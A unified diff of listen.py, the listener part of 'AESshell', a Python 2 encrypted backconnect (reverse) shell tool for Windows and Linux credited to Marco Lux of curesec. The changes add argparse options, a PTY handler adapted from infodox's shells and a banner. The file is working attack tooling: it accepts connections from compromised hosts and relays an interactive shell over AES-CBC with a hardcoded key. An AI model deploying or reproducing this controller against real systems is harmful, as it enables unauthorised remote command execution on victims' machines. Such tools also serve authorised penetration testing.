@@ -1,21 +1,82 @@
 #!/usr/bin/env python2
 #
 
+import os
 import sys
+import time
+import fcntl
 import socket
 import select
+import termios
+import argparse
 
 # pycrypto based aes support
 import aes
 
-version = "0.6"
 
-def usage():
-	print "AESshell v%s using AES-CBC + HMAC-SHA256" % version
-	print "listener part, this is were you want back connect to"
-	print "spring 2015 by Marco Lux <ping@curesec.com>"
-	print
-	print "%s <ip> <port>" % (sys.argv[0])
+class PTY:
+	""" rip off from infodox pty handler implementation
+		https://github.com/infodox/python-pty-shells
+	"""
+
+	def __init__(self, slave=0, pid=os.getpid()):
+		# apparently python GC's modules before class instances so, here
+		# we have some hax to ensure we can restore the terminal state.
+		self.termios, self.fcntl = termios, fcntl
+
+		# open our controlling PTY
+		self.pty  = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")
+
+		# store our old termios settings so we can restore after
+		# we are finished 
+		self.oldtermios = termios.tcgetattr(self.pty)
+
+		# get the current settings se we can modify them
+		newattr = termios.tcgetattr(self.pty)
+
+		# set the terminal to uncanonical mode and turn off
+		# input echo.
+		newattr[3] &= ~termios.ICANON & ~termios.ECHO
+
+		# don't handle ^C / ^Z / ^\
+		newattr[6][termios.VINTR] = '\x00'
+		newattr[6][termios.VQUIT] = '\x00'
+		newattr[6][termios.VSUSP] = '\x00'
+
+		# set our new attributes
+		termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)
+
+		# store the old fcntl flags
+		self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
+		# fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
+		# make the PTY non-blocking
+		fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)
+
+	def read(self, size=8192):
+		return self.pty.read(size)
+
+	def write(self, data):
+		ret = self.pty.write(data)
+		self.pty.flush()
+		return ret
+
+	def fileno(self):
+		return self.pty.fileno()
+
+	def __del__(self):
+		# restore the terminal settings on deletion
+		self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
+		self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)
+
+def banner():
+	"""
+	   _____  ___________ _________      .__           .__  .__   
+	  /  _  \ \_   _____//   _____/ _____|  |__   ____ |  | |  |  
+	 /  /_\  \ |    __)_ \_____  \ /  ___/  |  \_/ __ \|  | |  |  
+	/    |    \|        \/        \\\\___ \|   Y  \  ___/|  |_|  |__
+	\____|__  /_______  /_______  /____  >___|  /\___  >____/____/
+		\/        \/        \/     \/     \/     \/           
+	"""
 
 def bindSocket(lip,lport):
 	# create a socket
@@ -31,57 +92,83 @@ def bindSocket(lip,lport):
 
 	return s
 
-if len(sys.argv)<3:
-	usage()
-	sys.exit(1)
+def run(lip, lport, remoteOs):
+	key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
+	s = bindSocket(lip,lport)
+	serv = s
+	conn, addr = s.accept()
 
-lip = sys.argv[1]
-lport = int(sys.argv[2])
-key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
-s = bindSocket(lip,lport)
-conn, addr = s.accept()
+	# initialize aes class
+	ac=aes.Crypticle(key)
 
-# initialize aes class
-ac=aes.Crypticle(key)
+	# yeah, we just accept one client ;)
+	inputs = []
+	inputs.append(conn)
 
-# yeah, we just accept one client ;)
-inputs = []
-inputs.append(sys.stdin)
-inputs.append(conn)
+	# spawn pty class from infodox if we expect back a unix client
+	pty = ''
+	if remoteOs == 'lnx':
+		pty = PTY()
+		inputs.append(pty)
+	else:
+		inputs.append(sys.stdin)
 
-cbuffer = ""
 
-print "Connected: ", addr
-while True:
+	cbuffer = ""
+	print "[*] Connected: %s:%d" % (addr[0],addr[1])
+	while True:
 
-	try:
-		inputrd, outputrd, errorrd = select.select(inputs,[],[])
-	except select.error,e:
-		print e
-		break
-	except socket.error,e:
-		print e
-		break
+		try:
+			inputrd, outputrd, errorrd = select.select(inputs,[],[])
+		except select.error,e:
+			print e
+			break
+		except socket.error,e:
+			print e
+			break
 
-	for s in inputrd:
-		if s == conn:
-			data = s.recv(1)
+		for s in inputrd:
+			if s == conn:
+				data = s.recv(1)
 
-			if data == '':
-				print "Backconnect vanished!"
-				sys.exit(1)
+				if data == '':
+					print "Backconnect vanished!"
+					sys.exit(1)
 
-			cbuffer += data
-			decContent = ac.loads(cbuffer)
-			if decContent != -1:
-				cbuffer = ""
-				sys.stdout.write(decContent)
-				sys.stdout.flush()
-		else:
-			sendData = sys.stdin.readline()
+				cbuffer += data
+				decContent = ac.loads(cbuffer)
+				if decContent != -1:
+					cbuffer = ""
+					sys.stdout.write(decContent)
+					sys.stdout.flush()
 
-			encContent = ac.dumps(sendData)
-			if encContent != -1:
-				conn.send(encContent)
+			elif s == pty:
+				data = s.read(1024)
+				encContent = ac.dumps(data)
+				if encContent !=-1:
+					conn.send(encContent)
+			else:
+				# we have a remote win and choosen the ugly stdin method
+				sendData = sys.stdin.readline()
+				encContent = ac.dumps(sendData)
+				if encContent != -1:
+					conn.send(encContent)
 
-print "[*] Finished"
+	print "[*] Finished"
+
+def main():
+	print banner.func_doc
+	version = "0.7"
+	parser_description = "AESshell v%s - backconnect shell for windows and linux\n\t\tusing AES CBC Mode and HMAC-SHA256\n\t\tspring 2015 by Marco Lux <ping@curesec.com>" % version
+	parser = argparse.ArgumentParser(	prog = 'AESshell client (listen.py)',\
+										description = parser_description,\
+										formatter_class=argparse.RawTextHelpFormatter)
+
+	parser.add_argument("-lip", action="store",dest="lip", required=True,help="Local IP you want to bind the client part")
+	parser.add_argument("-lport", action="store",dest="lport", type=int,required=True,help="Local Port you want to bind to")
+	parser.add_argument("-os", action="store",dest="remoteOs", default="lnx",required=True,help="expected remote OS (lnx/win)",choices=['lnx', 'win'])
+	args = parser.parse_args()
+	run(args.lip,args.lport,args.remoteOs)
+
+if __name__ == '__main__':
+	main()
